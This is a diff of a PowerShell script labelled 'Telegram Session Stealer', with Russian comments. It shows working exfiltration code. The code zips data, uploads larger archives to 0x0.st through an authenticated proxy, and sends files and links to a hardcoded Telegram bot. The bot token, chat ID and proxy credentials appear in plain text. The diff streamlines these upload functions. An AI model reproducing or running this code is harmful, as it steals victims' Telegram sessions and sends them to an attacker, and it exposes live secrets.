@@ -1,44 +1,25 @@
 # ============================================================
-# Telegram Session Stealer + 0x0.st + Proxy (с fallback)
+# Telegram Session Stealer + 0x0.st + Proxy (400 fix)
 # ============================================================
 
 $botToken = "8865169520:AAGWKCEINgQtP2Jtd3783tkOx-V2Uhq8D3A"
 $chatId   = "8620709143"
 
 # Прокси
-$proxyHost = "gate.proxydata.ru"
-$proxyPort = 3129
-$proxyUser = "user-xpx93ax5"
-$proxyPass = "5pxp942ldb7jtnh2"
+$proxy = New-Object System.Net.WebProxy("http://gate.proxydata.ru:3129", $true)
+$proxy.Credentials = New-Object System.Net.NetworkCredential("user-xpx93ax5", "5pxp942ldb7jtnh2")
 
-$proxy = New-Object System.Net.WebProxy("http://$proxyHost`:$proxyPort", $true)
-$proxy.Credentials = New-Object System.Net.NetworkCredential($proxyUser, $proxyPass)
-
-# Функция отправки в Telegram (с fallback на curl.exe)
+# Универсальная функция отправки в Telegram
 function Send-TelegramMessage {
     param($text)
     $url = "https://api.telegram.org/bot$botToken/sendMessage"
-    $body = @{ chat_id = $chatId; text = $text } | ConvertTo-Json
+    $body = @{ chat_id = $chatId; text = $text } | ConvertTo-Json -Compress
 
-    # Пытаемся через WebClient
-    try {
-        $wc = New-Object System.Net.WebClient
-        $wc.Proxy = $proxy
-        $wc.Encoding = [System.Text.Encoding]::UTF8
-        $wc.Headers.Add("Content-Type", "application/json")
-        $wc.UploadString($url, "POST", $body) | Out-Null
-        return $true
-    } catch {
-        # Если не вышло – пробуем через curl.exe
-        $tempFile = [System.IO.Path]::GetTempFileName()
-        $body | Out-File -FilePath $tempFile -Encoding UTF8
-        $proxyUrl = "http://$proxyHost`:$proxyPort"
-        $proxyAuth = "$proxyUser`:$proxyPass"
-        $cmd = "curl.exe -x $proxyUrl -U $proxyAuth -H 'Content-Type: application/json' -X POST -d @$tempFile $url 2>nul"
-        Invoke-Expression $cmd
-        Remove-Item $tempFile -Force
-        return $true
-    }
+    $wc = New-Object System.Net.WebClient
+    $wc.Proxy = $proxy
+    $wc.Encoding = [System.Text.Encoding]::UTF8
+    $wc.Headers.Add("Content-Type", "application/json; charset=utf-8")
+    $wc.UploadString($url, "POST", $body) | Out-Null
 }
 
 # Функция загрузки на 0x0.st
@@ -47,19 +28,7 @@ function Upload-To0x0 {
     $wc = New-Object System.Net.WebClient
     $wc.Proxy = $proxy
     $response = $wc.UploadFile("https://0x0.st", "POST", $filePath)
-    if ($response) {
-        return [System.Text.Encoding]::UTF8.GetString($response).Trim()
-    } else {
-        # fallback: пробуем через curl.exe
-        $proxyUrl = "http://$proxyHost`:$proxyPort"
-        $proxyAuth = "$proxyUser`:$proxyPass"
-        $tempOutput = [System.IO.Path]::GetTempFileName()
-        $cmd = "curl.exe -x $proxyUrl -U $proxyAuth -F 'file=@$filePath' https://0x0.st -o $tempOutput 2>nul"
-        Invoke-Expression $cmd
-        $link = Get-Content $tempOutput -Raw
-        Remove-Item $tempOutput -Force
-        return $link.Trim()
-    }
+    return [System.Text.Encoding]::UTF8.GetString($response).Trim()
 }
 
 try {
@@ -92,7 +61,7 @@ try {
         $link = Upload-To0x0 -filePath $zip
         Send-TelegramMessage "$caption`nDownload: $link"
     } else {
-        # Отправляем маленький файл напрямую (multipart)
+        # Маленький файл – multipart/form-data
         $bytes = [System.IO.File]::ReadAllBytes($zip)
         $boundary = "---------------------------$([DateTime]::Now.Ticks.ToString('x'))"
         $multipart = @()
@@ -109,26 +78,14 @@ try {
         $headers = @{ "Content-Type" = "multipart/form-data; boundary=$boundary" }
         $url = "https://api.telegram.org/bot$botToken/sendDocument?chat_id=$chatId&caption=$caption"
 
-        # Сначала пробуем через WebClient
-        try {
-            $wc = New-Object System.Net.WebClient
-            $wc.Proxy = $proxy
-            foreach ($key in $headers.Keys) { $wc.Headers.Add($key, $headers[$key]) }
-            $data = [System.Text.Encoding]::UTF8.GetBytes(($multipart -join "`r`n"))
-            $wc.UploadData($url, "POST", $data) | Out-Null
-        } catch {
-            # Fallback через curl.exe
-            $tempData = [System.IO.Path]::GetTempFileName()
-            ($multipart -join "`r`n") | Out-File -FilePath $tempData -Encoding ASCII
-            $proxyUrl = "http://$proxyHost`:$proxyPort"
-            $proxyAuth = "$proxyUser`:$proxyPass"
-            $cmd = "curl.exe -x $proxyUrl -U $proxyAuth -X POST -H 'Content-Type: multipart/form-data; boundary=$boundary' --data-binary @$tempData $url 2>nul"
-            Invoke-Expression $cmd
-            Remove-Item $tempData -Force
-        }
+        $wc = New-Object System.Net.WebClient
+        $wc.Proxy = $proxy
+        $wc.Encoding = [System.Text.Encoding]::UTF8
+        foreach ($key in $headers.Keys) { $wc.Headers.Add($key, $headers[$key]) }
+        $data = [System.Text.Encoding]::UTF8.GetBytes(($multipart -join "`r`n"))
+        $wc.UploadData($url, "POST", $data) | Out-Null
     }
 
-    # 6. Удаляем архив
     Remove-Item $zip -Force -ErrorAction SilentlyContinue
     Send-TelegramMessage "✅ Done"
 
